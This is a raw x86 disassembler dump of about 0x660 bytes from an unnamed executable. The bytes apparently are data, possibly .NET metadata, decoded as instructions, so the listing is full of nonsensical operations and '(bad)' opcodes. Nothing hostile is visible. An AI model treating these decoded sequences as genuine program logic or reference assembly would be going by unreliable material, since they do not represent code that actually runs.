  405cd6:	25 15 bd 05 0a       	and    $0xa05bd15,%eax
  405cdb:	00 8f 0e b0 1e 06    	add    %cl,0x61eb00e(%edi)
  405ce1:	00 ac 1a bd 05 0a 00 	add    %ch,0xa05bd(%edx,%ebx,1)
  405ce8:	ad                   	lods   %ds:(%esi),%eax
  405ce9:	0e                   	push   %cs
  405cea:	b0 1e                	mov    $0x1e,%al
  405cec:	06                   	push   %es
  405ced:	00 4e 26             	add    %cl,0x26(%esi)
  405cf0:	33 00                	xor    (%eax),%eax
  405cf2:	16                   	push   %ss
  405cf3:	00 e9                	add    %ch,%cl
  405cf5:	1f                   	pop    %ds
  405cf6:	cc                   	int3
  405cf7:	0a 06                	or     (%esi),%al
  405cf9:	00 36                	add    %dh,(%esi)
  405cfb:	16                   	push   %ss
  405cfc:	33 00                	xor    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 5f 0e             	add    %bl,0xe(%edi)
  405d02:	bd 05 06 00 30       	mov    $0x30000605,%ebp
  405d07:	18 bd 05 06 00 4d    	sbb    %bh,0x4d000605(%ebp)
  405d0d:	0d bd 05 06 00       	or     $0x605bd,%eax
  405d12:	6f                   	outsl  %ds:(%esi),(%dx)
  405d13:	1d bd 05 06 00       	sbb    $0x605bd,%eax
  405d18:	a2 1a bd 05 16       	mov    %al,0x1605bd1a
  405d1d:	00 bb 1a c3 1e 1a    	add    %bh,0x1a1ec31a(%ebx)
  405d23:	00 15 1d 9c 22 1a    	add    %dl,0x1a229c1d
  405d29:	00 18                	add    %bl,(%eax)
  405d2b:	1a 9c 22 8b 01 bc 1d 	sbb    0x1dbc018b(%edx,%eiz,1),%bl
  405d32:	00 00                	add    %al,(%eax)
  405d34:	1a 00                	sbb    (%eax),%al
  405d36:	8f                   	(bad)
  405d37:	21 9c 22 06 00 43 1e 	and    %ebx,0x1e430006(%edx,%eiz,1)
  405d3e:	95                   	xchg   %eax,%ebp
  405d3f:	18 06                	sbb    %al,(%esi)
  405d41:	00 4e 00             	add    %cl,0x0(%esi)
  405d44:	95                   	xchg   %eax,%ebp
  405d45:	18 06                	sbb    %al,(%esi)
  405d47:	00 8c 18 95 18 06 00 	add    %cl,0x61895(%eax,%ebx,1)
  405d4e:	70 00                	jo     0x405d50
  405d50:	95                   	xchg   %eax,%ebp
  405d51:	18 06                	sbb    %al,(%esi)
  405d53:	00 5c 1c f3          	add    %bl,-0xd(%esp,%ebx,1)
  405d57:	25 06 00 de 18       	and    $0x18de0006,%eax
  405d5c:	f3 25 06 00 46 0f    	repz and $0xf460006,%eax
  405d62:	95                   	xchg   %eax,%ebp
  405d63:	18 06                	sbb    %al,(%esi)
  405d65:	00 39                	add    %bh,(%ecx)
  405d67:	19 95 18 1e 00 c1    	sbb    %edx,-0x3effe1e8(%ebp)
  405d6d:	19 55 20             	sbb    %edx,0x20(%ebp)
  405d70:	06                   	push   %es
  405d71:	00 92 26 09 17 06    	add    %dl,0x6170926(%edx)
  405d77:	00 23                	add    %ah,(%ebx)
  405d79:	17                   	pop    %ss
  405d7a:	09 17                	or     %edx,(%edi)
  405d7c:	06                   	push   %es
  405d7d:	00 6d 0e             	add    %ch,0xe(%ebp)
  405d80:	09 17                	or     %edx,(%edi)
  405d82:	06                   	push   %es
  405d83:	00 a4 0b 95 18 06 00 	add    %ah,0x61895(%ebx,%ecx,1)
  405d8a:	4b                   	dec    %ebx
  405d8b:	0e                   	push   %cs
  405d8c:	8e 13                	mov    (%ebx),%ss
  405d8e:	0a 00                	or     (%eax),%al
  405d90:	2e 1d 33 00 0a 00    	cs sbb $0xa0033,%eax
  405d96:	34 21                	xor    $0x21,%al
  405d98:	33 00                	xor    (%eax),%eax
  405d9a:	06                   	push   %es
  405d9b:	00 d2                	add    %dl,%dl
  405d9d:	0c 33                	or     $0x33,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	f9                   	stc
  405da3:	1d 00 00 12 00       	sbb    $0x120000,%eax
  405da8:	d9 0d 14 1c 06 00    	(bad) 0x61c14
  405dae:	0b 00                	or     (%eax),%eax
  405db0:	b1 0a                	mov    $0xa,%cl
  405db2:	06                   	push   %es
  405db3:	00 50 19             	add    %dl,0x19(%eax)
  405db6:	95                   	xchg   %eax,%ebp
  405db7:	18 06                	sbb    %al,(%esi)
  405db9:	00 10                	add    %dl,(%eax)
  405dbb:	26 ec                	es in  (%dx),%al
  405dbd:	19 06                	sbb    %eax,(%esi)
  405dbf:	00 bc 0f 95 18 06 00 	add    %bh,0x61895(%edi,%ecx,1)
  405dc6:	04 1e                	add    $0x1e,%al
  405dc8:	95                   	xchg   %eax,%ebp
  405dc9:	18 06                	sbb    %al,(%esi)
  405dcb:	00 27                	add    %ah,(%edi)
  405dcd:	0e                   	push   %cs
  405dce:	95                   	xchg   %eax,%ebp
  405dcf:	18 22                	sbb    %ah,(%edx)
  405dd1:	00 c8                	add    %cl,%al
  405dd3:	1a b5 1c 22 00 bf    	sbb    -0x40ffdde4(%ebp),%dh
  405dd9:	1f                   	pop    %ds
  405dda:	b5 1c                	mov    $0x1c,%ch
  405ddc:	22 00                	and    (%eax),%al
  405dde:	dc 1c b5 1c 12 00 d4 	fcompl -0x2bffede4(,%esi,4)
  405de5:	1c 00                	sbb    $0x0,%al
  405de7:	1f                   	pop    %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	d7                   	xlat   %ds:(%ebx)
  405deb:	1f                   	pop    %ds
  405dec:	b5 1c                	mov    $0x1c,%ch
  405dee:	06                   	push   %es
  405def:	00 96 1f f3 25 06    	add    %dl,0x625f31f(%esi)
  405df5:	00 6d 1a             	add    %ch,0x1a(%ebp)
  405df8:	95                   	xchg   %eax,%ebp
  405df9:	18 06                	sbb    %al,(%esi)
  405dfb:	00 9d 1f f3 25 12    	add    %bl,0x1225f31f(%ebp)
  405e01:	00 8e 1c f3 25 06    	add    %cl,0x625f31c(%esi)
  405e07:	00 53 18             	add    %dl,0x18(%ebx)
  405e0a:	f3 25 06 00 87 00    	repz and $0x870006,%eax
  405e10:	f3 25 06 00 57 1a    	repz and $0x1a570006,%eax
  405e16:	95                   	xchg   %eax,%ebp
  405e17:	18 06                	sbb    %al,(%esi)
  405e19:	00 b7 18 f3 25 06    	add    %dh,0x625f318(%edi)
  405e1f:	00 92 0d f3 25 06    	add    %dl,0x625f30d(%edx)
  405e25:	00 56 0d             	add    %dl,0xd(%esi)
  405e28:	f3 25 06 00 f8 18    	repz and $0x18f80006,%eax
  405e2e:	f3 25 06 00 71 0d    	repz and $0xd710006,%eax
  405e34:	f3 25 06 00 40 1a    	repz and $0x1a400006,%eax
  405e3a:	f3 25 06 00 f2 1c    	repz and $0x1cf20006,%eax
  405e40:	95                   	xchg   %eax,%ebp
  405e41:	18 06                	sbb    %al,(%esi)
  405e43:	00 a0 25 95 18 06    	add    %ah,0x6189525(%eax)
  405e49:	00 bd 20 00 1f 06    	add    %bh,0x61f0020(%ebp)
  405e4f:	00 04 0e             	add    %al,(%esi,%ecx,1)
  405e52:	95                   	xchg   %eax,%ebp
  405e53:	18 06                	sbb    %al,(%esi)
  405e55:	00 64 0b f3          	add    %ah,-0xd(%ebx,%ecx,1)
  405e59:	25 06 00 67 00       	and    $0x670006,%eax
  405e5e:	95                   	xchg   %eax,%ebp
  405e5f:	18 06                	sbb    %al,(%esi)
  405e61:	00 f2                	add    %dh,%dl
  405e63:	0d 95 18 06 00       	or     $0x61895,%eax
  405e68:	58                   	pop    %eax
  405e69:	0e                   	push   %cs
  405e6a:	95                   	xchg   %eax,%ebp
  405e6b:	18 06                	sbb    %al,(%esi)
  405e6d:	00 dc                	add    %bl,%ah
  405e6f:	20 bd 05 06 00 c1    	and    %bh,-0x3efff9fb(%ebp)
  405e75:	0f bd 05 0a 00 60 18 	bsr    0x1860000a,%eax
  405e7c:	ab                   	stos   %eax,%es:(%edi)
  405e7d:	19 0a                	sbb    %ecx,(%edx)
  405e7f:	00 82 0d ab 19 00    	add    %al,0x19ab0d(%edx)
  405e85:	00 00                	add    %al,(%eax)
  405e87:	00 9b 00 00 00 00    	add    %bl,0x0(%ebx)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 0b                	add    %cl,(%ebx)
  405e97:	23 e5                	and    %ebp,%esp
  405e99:	12 05 00 01 00 01    	adc    0x1000100,%al
  405e9f:	00 81 01 10 00 73    	add    %al,0x73001001(%ecx)
  405ea5:	04 e5                	add    $0xe5,%al
  405ea7:	12 05 00 01 00 03    	adc    0x3000100,%al
  405ead:	00 81 01 10 00 84    	add    %al,-0x7bffefff(%ecx)
  405eb3:	23 09                	and    (%ecx),%ecx
  405eb5:	12 05 00 13 00 06    	adc    0x6001300,%al
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 6d 06             	add    %ch,0x6(%ebp)
  405ec2:	bf 06 05 00 1e       	mov    $0x1e000506,%edi
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	60                   	pusha
  405ecf:	0a 0a                	or     (%edx),%cl
  405ed1:	07                   	pop    %es
  405ed2:	05 00 1e 00 26       	add    $0x26001e00,%eax
  405ed7:	00 81 01 10 00 d2    	add    %al,-0x2dffefff(%ecx)
  405edd:	05 0a 07 05 00       	add    $0x5070a,%eax
  405ee2:	1e                   	push   %ds
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 54 23 0a          	add    %dl,0xa(%ebx,%eiz,1)
  405eed:	07                   	pop    %es
  405eee:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405ef3:	00 81 01 10 00 7f    	add    %al,0x7f001001(%ecx)
  405ef9:	08 0a                	or     %cl,(%edx)
  405efb:	07                   	pop    %es
  405efc:	05 00 1e 00 30       	add    $0x30001e00,%eax
  405f01:	00 81 01 10 00 a5    	add    %al,-0x5affefff(%ecx)
  405f07:	23 0a                	and    (%edx),%ecx
  405f09:	07                   	pop    %es
  405f0a:	05 00 1e 00 36       	add    $0x36001e00,%eax
  405f0f:	00 81 01 10 00 ea    	add    %al,-0x15ffefff(%ecx)
  405f15:	26 0a 07             	or     %es:(%edi),%al
  405f18:	05 00 1f 00 38       	add    $0x38001f00,%eax
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 83 04 00 00 39    	add    %al,0x39000004(%ebx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 e4    	add    %al,-0x1bffefff(%ecx)
  405f31:	00 0a                	add    %cl,(%edx)
  405f33:	07                   	pop    %es
  405f34:	05 00 23 00 3e       	add    $0x3e002300,%eax
  405f39:	00 81 01 10 00 38    	add    %al,0x38001001(%ecx)
  405f3f:	1c 0a                	sbb    $0xa,%al
  405f41:	07                   	pop    %es
  405f42:	05 00 23 00 41       	add    $0x41002300,%eax
  405f47:	00 81 01 10 00 35    	add    %al,0x35001001(%ecx)
  405f4d:	07                   	pop    %es
  405f4e:	c1 16 05             	rcll   $0x5,(%esi)
  405f51:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f54:	46                   	inc    %esi
  405f55:	00 83 01 10 00 54    	add    %al,0x54001001(%ebx)
  405f5b:	06                   	push   %es
  405f5c:	00 00                	add    %al,(%eax)
  405f5e:	05 00 25 00 4b       	add    $0x4b002500,%eax
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 a6 12 bd 15 05    	add    %ah,0x515bd12(%esi)
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 fd 01    	addl   $0x1fd0010,(%ecx)
  405f78:	bd 15 05 00 2d       	mov    $0x2d000515,%ebp
  405f7d:	00 52 00             	add    %dl,0x0(%edx)
  405f80:	00 01                	add    %al,(%ecx)
  405f82:	00 00                	add    %al,(%eax)
  405f84:	88 24 00             	mov    %ah,(%eax,%eax,1)
  405f87:	00 05 00 2d 00 54    	add    %al,0x54002d00
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 33                	add    %dh,(%ebx)
  405f93:	0d 00 00 51 00       	or     $0x510000,%eax
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 a4 1d 88 03 05 00 	add    %ah,0x50388(%ebp,%ebx,1)
  405fa6:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 13                	add    %dl,(%ebx)
  405faf:	25 88 03 05 00       	and    $0x50388,%eax
  405fb4:	2f                   	das
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	0d 09 88 03 05       	or     $0x5038809,%eax
  405fc1:	00 31                	add    %dh,(%ecx)
  405fc3:	00 63 00             	add    %ah,0x0(%ebx)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	4a                   	dec    %edx
  405fcb:	04 88                	add    $0x88,%al
  405fcd:	03 05 00 33 00 6a    	add    0x6a003300,%eax
  405fd3:	00 01                	add    %al,(%ecx)
  405fd5:	01 00                	add    %eax,(%eax)
  405fd7:	00 77 05             	add    %dh,0x5(%edi)
  405fda:	88 03                	mov    %al,(%ebx)
  405fdc:	39 00                	cmp    %eax,(%eax)
  405fde:	3a 00                	cmp    (%eax),%al
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 58 1b             	add    %bl,0x1b(%eax)
  405fe8:	88 03                	mov    %al,(%ebx)
  405fea:	05 00 47 00 95       	add    $0x95004700,%eax
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 66 1b             	add    %ah,0x1b(%esi)
  405ff6:	88 03                	mov    %al,(%ebx)
  405ff8:	05 00 47 00 99       	add    $0x99004700,%eax
  405ffd:	00 81 01 10 00 1b    	add    %al,0x1b001001(%ecx)
  406003:	05 88 03 05 00       	add    $0x50388,%eax
  406008:	47                   	inc    %edi
  406009:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  40600f:	00 f9                	add    %bh,%cl
  406011:	03 00                	add    (%eax),%eax
  406013:	00 05 00 47 00 a4    	add    %al,0xa4004700
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 53 09             	add    %dl,0x9(%ebx)
  406020:	00 00                	add    %al,(%eax)
  406022:	51                   	push   %ecx
  406023:	00 48 00             	add    %cl,0x0(%eax)
  406026:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406027:	00 16                	add    %dl,(%esi)
  406029:	00 c7                	add    %al,%bh
  40602b:	05 12 00 16 00       	add    $0x160012,%eax
  406030:	f2 01 12             	repnz add %edx,(%edx)
  406033:	00 16                	add    %dl,(%esi)
  406035:	00 32                	add    %dh,(%edx)
  406037:	1b 12                	sbb    (%edx),%edx
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 a3 1b 12 00 16    	add    %ah,0x1600121b(%ebx)
  406041:	00 5f 15             	add    %bl,0x15(%edi)
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 04 08             	add    %al,(%eax,%ecx,1)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 b9 04 12 00 16    	add    %bh,0x16001204(%ecx)
  406053:	00 ce                	add    %cl,%dh
  406055:	26 12 00             	adc    %es:(%eax),%al
  406058:	16                   	push   %ss
  406059:	00 ef                	add    %ch,%bh
  40605b:	0a 12                	or     (%edx),%dl
  40605d:	00 16                	add    %dl,(%esi)
  40605f:	00 af 06 12 00 16    	add    %ch,0x16001206(%edi)
  406065:	00 fd                	add    %bh,%ch
  406067:	0c 15                	or     $0x15,%al
  406069:	00 16                	add    %dl,(%esi)
  40606b:	00 be 26 12 00 16    	add    %bh,0x16001226(%esi)
  406071:	00 fc                	add    %bh,%ah
  406073:	17                   	pop    %ss
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 0e                	add    %cl,(%esi)
  406079:	0a 12                	or     (%edx),%dl
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 56 08             	add    %dl,0x8(%esi)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 91 15 12 00 16    	add    %dl,0x16001215(%ecx)
  406089:	00 6e 16             	add    %ch,0x16(%esi)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 f9                	add    %bh,%cl
  406091:	1b 12                	sbb    (%edx),%edx
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 b0 0c 21 00 11    	add    %dh,0x1100210c(%eax)
  40609b:	00 95 0c 25 00 11    	add    %dl,0x1100250c(%ebp)
  4060a1:	00 65 0c             	add    %ah,0xc(%ebp)
  4060a4:	29 00                	sub    %eax,(%eax)
  4060a6:	11 00                	adc    %eax,(%eax)
  4060a8:	fb                   	sti
  4060a9:	0b 2d 00 11 00 7d    	or     0x7d001100,%ebp
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 e0                	add    %ah,%al
  4060b5:	0b 30                	or     (%eax),%esi
  4060b7:	00 11                	add    %dl,(%ecx)
  4060b9:	00 c3                	add    %al,%bl
  4060bb:	0b 34 00             	or     (%eax,%eax,1),%esi
  4060be:	31 00                	xor    %eax,(%eax)
  4060c0:	a9 0b 37 00 11       	test   $0x1100370b,%eax
  4060c5:	00 17                	add    %dl,(%edi)
  4060c7:	0c 30                	or     $0x30,%al
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 4b 0c             	add    %cl,0xc(%ebx)
  4060ce:	3a 00                	cmp    (%eax),%al
  4060d0:	11 00                	adc    %eax,(%eax)
  4060d2:	2d 0c 34 00 16       	sub    $0x1600340c,%eax
  4060d7:	00 2e                	add    %ch,(%esi)
  4060d9:	04 dc                	add    $0xdc,%al
  4060db:	00 06                	add    %al,(%esi)
  4060dd:	06                   	push   %es
  4060de:	ce                   	into
  4060df:	09 06                	or     %eax,(%esi)
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	39 24 09             	cmp    %esp,(%ecx,%ecx,1)
  4060e7:	01 56 80             	add    %edx,-0x80(%esi)
  4060ea:	3d 02 09 01 56       	cmp    $0x56010902,%eax
  4060ef:	80 98 01 09 01 31 00 	sbbb   $0x0,0x31010901(%eax)
  4060f6:	09 06                	or     %eax,(%esi)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 34 03             	add    %dh,(%ebx,%eax,1)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 01                	add    %al,(%ecx)
  406103:	05 43 01 51 80       	add    $0x80510143,%eax
  406108:	9a 0a 3a 00 51 80 75 	lcall  $0x7580,$0x51003a0a
  40610f:	25 3a 00 51 80       	and    $0x8051003a,%eax
  406114:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406115:	17                   	pop    %ss
  406116:	3a 00                	cmp    (%eax),%al
  406118:	51                   	push   %ecx
  406119:	80 3a 08             	cmpb   $0x8,(%edx)
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	0c 18                	or     $0x18,%al
  406122:	29 00                	sub    %eax,(%eax)
  406124:	21 00                	and    %eax,(%eax)
  406126:	c8 04 29 00          	enter  $0x2904,$0x0
  40612a:	31 00                	xor    %eax,(%eax)
  40612c:	ff 09                	decl   (%ecx)
  40612e:	29 00                	sub    %eax,(%eax)
  406130:	33 01                	xor    (%ecx),%eax
  406132:	eb 1b                	jmp    0x40614f
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	6e                   	outsb  %ds:(%esi),(%dx)
  406139:	09 8f 01 01 00 18    	or     %ecx,0x18000101(%edi)
  40613f:	02 30                	add    (%eax),%dh
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 6a 05             	add    %ch,0x5(%edx)
  406146:	3a 00                	cmp    (%eax),%al
  406148:	01 00                	add    %eax,(%eax)
  40614a:	18 02                	sbb    %al,(%edx)
  40614c:	30 01                	xor    %al,(%ecx)
  40614e:	01 00                	add    %eax,(%eax)
  406150:	29 25 c7 01 01 00    	sub    %esp,0x101c7
  406156:	c7 07 12 00 01 00    	movl   $0x10012,(%edi)
  40615c:	0b 0b                	or     (%ebx),%ecx
  40615e:	12 00                	adc    (%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	b1 12                	mov    $0x12,%cl
  406164:	37                   	aaa
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 d6                	add    %dl,%dh
  406169:	04 02                	add    $0x2,%al
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 2a                	add    %ch,(%edx)
  40616f:	01 c7                	add    %eax,%edi
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 18                	add    %bl,(%eax)
  406175:	02 30                	add    (%eax),%dh
  406177:	01 01                	add    %eax,(%ecx)
  406179:	00 43 01             	add    %al,0x1(%ebx)
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	ce                   	into
  406181:	09 3a                	or     %edi,(%edx)
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	30 02                	xor    %al,(%edx)
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 89 09 02 02 56 80 	orb    $0x80,0x56020209(%ecx)
  406192:	67 25 02 02 56 80    	addr16 and $0x80560202,%eax
  406198:	f2 08 02             	repnz or %al,(%edx)
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	4f                   	dec    %edi
  40619f:	25 02 02 56 80       	and    $0x80560202,%eax
  4061a4:	b1 00                	mov    $0x0,%cl
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 20 1c             	andb   $0x1c,(%eax)
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 66 04 02          	andb   $0x2,0x4(%esi)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	97                   	xchg   %eax,%edi
  4061b7:	1b 02                	sbb    (%edx),%eax
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	53                   	push   %ebx
  4061bd:	24 02                	and    $0x2,%al
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	56                   	push   %esi
  4061c3:	21 02                	and    %eax,(%edx)
  4061c5:	02 56 80             	add    -0x80(%esi),%dl
  4061c8:	cf                   	iret
  4061c9:	14 02                	adc    $0x2,%al
  4061cb:	02 33                	add    (%ebx),%dh
  4061cd:	01 e3                	add    %esp,%ebx
  4061cf:	04 fd                	add    $0xfd,%al
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 41 19             	add    %al,0x19(%ecx)
  4061dc:	0a 00                	or     (%eax),%al
  4061de:	01 00                	add    %eax,(%eax)
  4061e0:	78 20                	js     0x406202
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	0e                   	push   %cs
  4061e9:	1e                   	push   %ds
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 b3 08 1d 00 01    	add    %dh,0x1001d08(%ebx)
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 60 06             	add    %ah,0x6(%eax)
  406206:	1d 00 01 00 c0       	sbb    $0xc0000100,%eax
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 14 1e 0a    	add    %dl,0xa1e1418(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 6b 22 3d    	add    %dl,0x3d226b08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 79 22 42    	add    %dl,0x42227908(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 4f 22 48    	add    %dl,0x48224f08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 5d 22 4d    	add    %dl,0x4d225d08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 e3 1c 53    	add    %dl,0x531ce308(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 ee 1c 58    	add    %dl,0x581cee08(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 53 12 5e    	add    %dl,0x5e125308(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 62 12             	or     %ah,0x12(%edx)
  406284:	62 00                	bound  %eax,(%eax)
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 06 22 5e    	add    %dl,0x5e220608(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 11 22 62    	add    %dl,0x62221108(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 14 12 67    	add    %dl,0x67121408(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 22 12 6c    	add    %dl,0x6c122208(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 80 0b 1d    	add    %dl,0x1d0b8008(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 90 0b 72    	add    %dl,0x720b9008(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 e2 0a 77    	add    %dl,0x770ae208(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 7c 13 67    	add    %dl,0x67137c08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 85 13 6c    	add    %dl,0x6c138508(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 34 17 7b    	add    %dl,0x7b173408(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 41 17 7f    	add    %dl,0x7f174108(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 70 14 1d    	add    %dl,0x1d147008(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 81 14 72    	add    %dl,0x72148108(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
